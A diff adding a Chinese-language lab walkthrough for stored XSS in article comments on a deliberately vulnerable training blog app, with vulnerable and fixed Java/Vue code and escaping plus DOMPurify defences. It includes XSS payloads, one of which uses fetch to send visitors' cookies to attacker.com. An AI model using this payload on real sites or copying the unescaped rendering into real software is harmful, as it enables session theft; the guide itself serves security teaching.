@@ -385,6 +385,164 @@ feedback.setContentHtml(sanitized);
 
 ---
 
+## 📍 场景 L4：存储型 XSS（文章评论）
+
+**难度**：⭐⭐⭐ 中级  
+**类型**：存储型 XSS  
+**攻击目标**：通过评论注入脚本，影响所有查看该文章的用户
+
+### 💡 攻击原理
+
+用户在文章详情页发表评论时注入恶意脚本，脚本被存储到数据库。之后所有访问该文章的用户（包括未登录用户）都会触发 XSS 攻击。
+
+**与其他场景的区别**：  
+- L0/L1：反射型，仅影响点击恶意链接的用户  
+- L2：存储型，但仅在访问特定用户主页时触发  
+- L3：盲 XSS，仅管理员可见  
+- L4：存储型，**所有访客都会中招**
+
+### 🎬 演示步骤
+
+**前置条件**：
+- ✅ 项目已启动在 VULN 模式
+- ✅ 已有测试账号（如 alice）
+
+**第一步：攻击者发表恶意评论（需要登录）**
+
+1. 使用普通用户账号登录：
+   - 用户名：`alice`
+   - 密码：`Admin#2025`
+
+2. 访问任意文章详情页（如文章 ID=1）：
+   `http://localhost:5173/article/1`
+
+3. 在评论输入框中输入恶意代码：
+   ```html
+   <img src=x onerror="alert('评论XSS攻击！\n文章：'+document.title+'\nCookie：'+document.cookie)">
+   ```
+
+4. 点击「发表评论」按钮
+
+5. 评论提交成功，恶意代码已存储到数据库
+
+**第二步：受害者访问文章（触发点）**
+
+1. **无需登录**，直接访问该文章：
+   `http://localhost:5173/article/1`
+
+2. **💥 XSS 触发！**
+   - 页面加载时立即弹窗
+   - 显示文章标题和 Cookie 信息
+   - 所有访问该文章的用户都会触发
+
+**第三步：真实攻击模拟（高级）**
+
+在真实攻击中，攻击者可能会：
+```html
+<img src=x onerror="fetch('https://attacker.com/steal',{method:'POST',body:JSON.stringify({cookie:document.cookie,url:location.href,referrer:document.referrer})})" style="display:none">
+<p>写得很好，学到了很多！</p>
+```
+
+这样每个访问该文章的用户的 Cookie 都会被发送到攻击者服务器。
+
+### ✅ 预期效果
+
+**VULN 模式**：
+- ✅ 评论发表成功
+- ✅ 页面刷新后，弹窗显示 Cookie 信息
+- ✅ 其他用户（包括未登录用户）访问该文章也会触发
+- ⚠️ 影响范围广，危害严重
+
+**SECURE 模式**：
+- ❌ 恶意代码被转义存储：`&lt;img src=x onerror=...&gt;`
+- ✅ 前端渲染时再用 DOMPurify 二次过滤
+- ✅ 页面只显示转义后的文本，不执行脚本
+- ✅ 双重防御确保安全
+
+### 💻 代码位置
+
+**后端存储** ([ArticleService.java](../apps/backend/src/main/java/com/techblog/backend/service/ArticleService.java)):
+```java
+@Transactional
+public CommentDto createComment(Long articleId, String username, CommentRequest request) {
+    // ...
+    String content = request.getContent();
+    if (xssProperties.isSecure()) {
+        // SECURE 模式：HTML 转义，防止 XSS
+        comment.setContentHtml(HtmlUtils.htmlEscape(content));
+    } else {
+        // VULN 模式：直接存储（存在 XSS 漏洞）
+        comment.setContentHtml(content);
+    }
+    // ...
+}
+```
+
+**前端渲染** ([ArticleDetail.vue](../apps/frontend/src/pages/ArticleDetail.vue)):
+```vue
+<!-- XSS 渲染说明：
+     - VULN：评论原样渲染（存储型 XSS 示例）
+     - SECURE：渲染前先净化 -->
+<div class="comment-content"
+     v-if="configStore.xssMode === 'vuln'"
+     v-html="comment.contentHtml"></div>
+<div class="comment-content"
+     v-else
+     v-html="pure(comment.contentHtml)"></div>
+```
+
+**权限控制** ([SecurityConfig.java](../apps/backend/src/main/java/com/techblog/backend/security/SecurityConfig.java)):
+```java
+.authorizeHttpRequests(auth -> auth
+    // 文章查询：公开访问
+    .requestMatchers(HttpMethod.GET, "/api/articles/**").permitAll()
+    // 评论提交：需要登录
+    .requestMatchers(HttpMethod.POST, "/api/articles/*/comments").authenticated()
+    // ...
+)
+```
+
+### 🛡️ SECURE 模式防御
+
+**后端双重防御**：
+```java
+// 1. 存储前转义（第一道防线）
+String sanitized = HtmlUtils.htmlEscape(request.getContent());
+comment.setContentHtml(sanitized);
+// 存储结果：&lt;img src=x onerror=...&gt;
+```
+
+**前端 DOMPurify 过滤**（第二道防线）：
+```javascript
+const pure = (html) => DOMPurify.sanitize(html, {
+  ALLOWED_TAGS: ['p', 'b', 'i', 'em', 'strong', 'a', 'code'],
+  ALLOWED_ATTR: { 'a': ['href', 'title'] }
+});
+```
+
+**防御效果**：  
+✅ 后端转义确保存储安全  
+✅ 前端过滤确保渲染安全  
+✅ 双重防御，即使一层失效也安全  
+✅ 符合深度防御（Defense in Depth）原则
+
+### 📊 影响范围对比
+
+| 场景 | 影响范围 | 触发条件 | 隐蔽性 |
+|------|----------|----------|--------|
+| L0/L1 | 点击链接的用户 | 主动点击恶意链接 | 低 |
+| L2 | 访问特定主页的用户 | 访问攻击者主页 | 中 |
+| L3 | 管理员 | 查看反馈详情 | 高 |
+| **L4** | **所有访问文章的用户** | **访问文章** | **中** |
+
+**L4 的特点**：
+- ⚠️ **影响范围最广**：所有访问该文章的用户
+- ⚠️ **无需特定操作**：只要打开文章就中招
+- ⚠️ **包括未登录用户**：查看评论不需要登录
+- ⚠️ **持续时间长**：评论长期存在，持续攻击
+
+---
+
 ## 🔧 故障排查
 
 ### 问题 1：XSS 攻击没有效果
